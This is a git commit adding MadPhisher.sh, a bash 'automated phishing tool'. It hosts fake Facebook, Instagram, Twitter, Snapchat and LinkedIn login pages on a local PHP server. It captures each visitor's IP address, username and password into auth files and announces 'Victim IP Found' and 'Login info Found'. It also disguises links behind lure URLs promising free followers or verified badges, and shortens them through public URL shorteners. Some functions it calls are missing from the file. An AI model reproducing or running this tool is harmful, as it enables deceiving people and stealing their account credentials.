05891b806fbc47f3d55269889eb36b8132a08458
Sajid Nayeem <theatomichackers@gmail.com>
2024-07-14 15:53:27 +0530

    Add files via upload

---
+++ MadPhisher.sh
@@ -0,0 +1,449 @@
+
+#!/bin/bash
+
+##   MadPhisher : 	Automated Phishing Tool
+##   Author 	: 	Sajid Ibn Nayeem
+##   Version 	: 	1.0
+##   Github 	: 	https://github.com/SajidIbnNayeem
+
+
+__version__="1.0"
+
+
+## DEFAULT HOST & PORT
+HOST='127.0.0.1'
+PORT='8080' 
+
+## ANSI colors (FG & BG)
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m\n')"
+
+## Directories
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+
+if [[ ! -d ".server" ]]; then
+	mkdir -p ".server"
+fi
+
+if [[ ! -d "auth" ]]; then
+	mkdir -p "auth"
+fi
+
+if [[ -d ".server/www" ]]; then
+	rm -rf ".server/www"
+	mkdir -p ".server/www"
+else
+	mkdir -p ".server/www"
+fi
+
+## Remove logfile
+if [[ -e ".server/.loclx" ]]; then
+	rm -rf ".server/.loclx"
+fi
+
+if [[ -e ".server/.cld.log" ]]; then
+	rm -rf ".server/.cld.log"
+fi
+
+## Script termination
+exit_on_signal_SIGINT() {
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+	exit 0
+}
+
+exit_on_signal_SIGTERM() {
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+	exit 0
+}
+
+trap exit_on_signal_SIGINT SIGINT
+trap exit_on_signal_SIGTERM SIGTERM
+
+## Reset terminal colors
+reset_color() {
+	tput sgr0   # reset attributes
+	tput op     # reset color
+	return
+}
+
+## Kill already running process
+kill_pid() {
+	check_PID="php cloudflared loclx"
+	for process in ${check_PID}; do
+		if [[ $(pidof ${process}) ]]; then # Check for Process
+			killall ${process} > /dev/null 2>&1 # Kill the Process
+		fi
+	done
+}
+
+
+## Banner
+banner() {
+	cat <<- EOF
+	
+	
+${RED}                                                 💥
+${PURPLE}                              
+${PURPLE}            █▀▄▀█ ▄▀█ █▀▄ █▀█ █░█ █ █▀ █░█ █▀▀ █▀█
+${PURPLE}            █░▀░█ █▀█ █▄▀ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄ 
+                     
+                        ${RED}Version : ${__version__}
+
+ ${GREEN} ➤ Tool Created by SajidibnNayeem (theatomichackers@gmail.com)${BLUE}
+	EOF
+}
+
+## Small Banner
+banner_small() {
+	cat <<- EOF
+ ${GREEN}                                      
+ ${GREEN}█▀▄▀█ ▄▀█ █▀▄ █▀█ █░█ █ █▀ █░█ █▀▀ █▀█
+ ${GREEN}█░▀░█ █▀█ █▄▀ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄${RED} ${__version__}
+	EOF
+}
+## Dependencies
+dependencies() {
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+
+	if [[ -d "/data/data/com.termux/files/home" ]]; then
+		if [[ ! $(command -v proot) ]]; then
+			echo -e "\n${RED}[+]${GREEN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+			pkg install proot resolv-conf -y
+		fi
+
+		if [[ ! $(command -v tput) ]]; then
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+			pkg install ncurses-utils -y
+		fi
+	fi
+
+	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+	else
+		pkgs=(php curl unzip)
+		for pkg in "${pkgs[@]}"; do
+			type -p "$pkg" &>/dev/null || {
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				if [[ $(command -v pkg) ]]; then
+					pkg install "$pkg" -y
+				elif [[ $(command -v apt) ]]; then
+					sudo apt install "$pkg" -y
+				elif [[ $(command -v apt-get) ]]; then
+					sudo apt-get install "$pkg" -y
+				elif [[ $(command -v pacman) ]]; then
+					sudo pacman -S "$pkg" --noconfirm
+				elif [[ $(command -v dnf) ]]; then
+					sudo dnf -y install "$pkg"
+				elif [[ $(command -v yum) ]]; then
+					sudo yum -y install "$pkg"
+				else
+					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+					{ reset_color; exit 1; }
+				fi
+			}
+		done
+	fi
+}
+
+
+
+
+
+## Exit message
+msg_exit() {
+	{ clear; banner; echo; }
+	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	{ reset_color; exit 0; }
+}
+
+## Choose custom port
+cusport() {
+	echo
+	read -n1 -p "${RED}[${WHITE}?${RED}]${GREEN} Do You Want A Custom Port ${ORANGE}[${BLUE}y${ORANGE}/${BLUE}N${ORANGE}]: ${GREEN}" P_ANS
+	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+		echo -e "\n"
+		read -n4 -p "${RED}[${WHITE}-${RED}]${BLUE} Enter Your Custom 4-digit Port [1024-9999] : ${GREEN}" CU_P
+		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
+			PORT=${CU_P}
+			echo
+		else
+			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+			{ sleep 2; clear; banner_small; cusport; }
+		fi		
+	else 
+		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+	fi
+}
+
+## Setup website and start php server
+setup_site() {
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	cp -rf .sites/"$website"/* .server/www
+	cp -f .sites/ip.php .server/www/
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+}
+
+## Get IP address
+capture_ip() {
+	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Victim's IP : ${GREEN}$IP"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${RED}auth/ip.txt"
+	cat .server/www/ip.txt >> auth/ip.txt
+}
+
+## Get credentials
+capture_creds() {
+	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
+	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Account : ${GREEN}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Password : ${GREEN}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${RED}auth/usernames.dat"
+	cat .server/www/usernames.txt >> auth/usernames.dat
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Waiting for Next Login Info, ${GREEN}Ctrl + C ${RED}to exit. "
+}
+
+## Print data
+capture_data() {
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Waiting for Login Info, ${GREEN}Ctrl + C ${RED}to exit..."
+	while true; do
+		if [[ -e ".server/www/ip.txt" ]]; then
+			echo -e "\n\n${RED}▄︻デ══━一💥${WHITE} Victim IP Found !"
+			capture_ip
+			rm -rf .server/www/ip.txt
+		fi
+		sleep 0.75
+		if [[ -e ".server/www/usernames.txt" ]]; then
+			echo -e "\n\n${RED}▄︻デ══━一💥${WHITE} Login info Found !!"
+			capture_creds
+			rm -rf .server/www/usernames.txt
+		fi
+		sleep 0.75
+	done
+}
+
+
+
+## Start localhost
+start_localhost() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	setup_site
+	{ sleep 1; clear; banner_small; }
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	capture_data
+}
+
+## Tunnel selection
+tunnel_menu() {
+	{ clear; banner_small; }
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${RED} Localhost
+
+	EOF
+
+	read -p "${BLUE}(★★) Enter (01) for  port forwarding service : ${GREEN}"
+
+	case $REPLY in 
+		1 | 01)
+			start_localhost;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; tunnel_menu; };;
+	esac
+}
+
+## Custom Mask URL
+custom_mask() {
+	{ sleep .5; clear; banner_small; echo; }
+	read -n1 -p "${RED}[?]${GREEN} Do you want to change Mask URL? ${ORANGE}[${BLUE}y${ORANGE}/${BLUE}N${ORANGE}] :${GREEN} " mask_op
+	echo
+	if [[ ${mask_op,,} == "y" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${GREEN}(${BLUE}Example: https://get-free-followers.com${GREEN})\n"
+		read -e -p "${BLUE} ➤ ${BLUE}" -i "https://" mask_url # initial text requires Bash 4+
+		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+			mask=$mask_url
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+		fi
+	fi
+}
+
+## URL Shortner
+site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
+
+shorten() {
+	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	if [[ "$1" == *"shrtco.de"* ]]; then
+		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	else
+		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
+		processed_url=${short#http*//}
+	fi
+}
+
+custom_url() {
+	url=${1#http*//}
+	isgd="https://is.gd/create.php?format=simple&url="
+	shortcode="https://api.shrtco.de/v2/shorten?url="
+	tinyurl="https://tinyurl.com/api-create.php?url="
+
+	{ custom_mask; sleep 1; clear; banner_small; }
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
+		if [[ $(site_stat $isgd) == 2* ]]; then
+			shorten $isgd "$url"
+		elif [[ $(site_stat $shortcode) == 2* ]]; then
+			shorten $shortcode "$url"
+		else
+			shorten $tinyurl "$url"
+		fi
+
+		url="https://$url"
+		masked_url="$mask@$processed_url"
+		processed_url="https://$processed_url"
+	else
+		# echo "[!] No url provided / Regex Not Matched"
+		url="Unable to generate links. Try after turning on hotspot"
+		processed_url="Unable to Short URL"
+	fi
+
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+}
+
+## Facebook
+site_facebook() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${RED} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${RED} Advanced Voting Poll Login Page
+		${RED}[${WHITE}03${RED}]${RED} Fake Security Login Page
+		${RED}[${WHITE}04${RED}]${RED} Facebook Messenger Login Page
+
+	EOF
+
+	read -p "${BLUE}(★★) Select an option : ${GREEN}"
+
+	case $REPLY in 
+		1 | 01)
+			website="facebook"
+			mask='https://blue-verified-badge-for-facebook-free'
+			tunnel_menu;;
+		2 | 02)
+			website="fb_advanced"
+			mask='https://vote-for-the-best-social-media'
+			tunnel_menu;;
+		3 | 03)
+			website="fb_security"
+			mask='https://make-your-facebook-secured-and-free-from-hackers'
+			tunnel_menu;;
+		4 | 04)
+			website="fb_messenger"
+			mask='https://get-messenger-premium-features-free'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_facebook; };;
+	esac
+}
+
+## Instagram
+site_instagram() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${RED}Traditional Login Page
+		${RED}[${WHITE}02${RED}]${RED}Auto Followers Login Page
+		${RED}[${WHITE}03${RED}]${RED}1000 Followers Login Page
+		${RED}[${WHITE}04${RED}]${RED}Blue Badge Verify Login Page
+
+	EOF
+
+	read -p "${BLUE}(★★) Select an option : ${GREEN}"
+
+	case $REPLY in 
+		1 | 01)
+			website="instagram"
+			mask='https://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		2 | 02)
+			website="ig_followers"
+			mask='https://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		3 | 03)
+			website="insta_followers"
+			mask='https://get-1000-followers-for-instagram'
+			tunnel_menu;;
+		4 | 04)
+			website="ig_verify"
+			mask='https://blue-badge-verify-for-instagram-free'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_instagram; };;
+	esac
+}
+
+
+
+
+
+
+## Menu
+main_menu() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${PURPLE}(×_×)${BLUE}Select An Attack For Your Victim ${RED}${BLUE}
+
+		${RED}[${WHITE}01${RED}]${YELLOW} Facebook
+${RED}[${WHITE}02${RED}]${YELLOW} Instagram
+		${RED}[${WHITE}03${RED}]${YELLOW} Twitter 
+		${RED}[${WHITE}04${RED}]${YELLOW} Snapchat
+		${RED}[${WHITE}05${RED}]${YELLOW} Linkedin
+		${RED}[${WHITE}99${RED}]${YELLOW} About
+		${RED}[${WHITE}00${RED}]${YELLOW} Exit
+	EOF
+	
+	read -p  "${BLUE}(★★) ${BLUE}Select an option : ${GREEN}"
+
+	case $REPLY in 
+		1 | 01)
+			site_facebook;;
+		2 | 02)
+			site_instagram;;
+		3 | 03)
+			website="twitter"
+			mask='https://get-blue-badge-on-twitter-free'
+			tunnel_menu;;
+		4 | 04)
+			website="snapchat"
+			mask='https://view-locked-snapchat-accounts-secretly'
+			tunnel_menu;;
+		5 | 05)
+			website="linkedin"
+			mask='https://get-a-premium-plan-for-linkedin-free'
+			tunnel_menu;;
+		99)
+			about;;
+		0 | 00 )
+			msg_exit;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; main_menu; };;
+	
+	esac
+}
+
+## Main
+kill_pid
+dependencies
+install_cloudflared
+install_localxpose
+main_menu
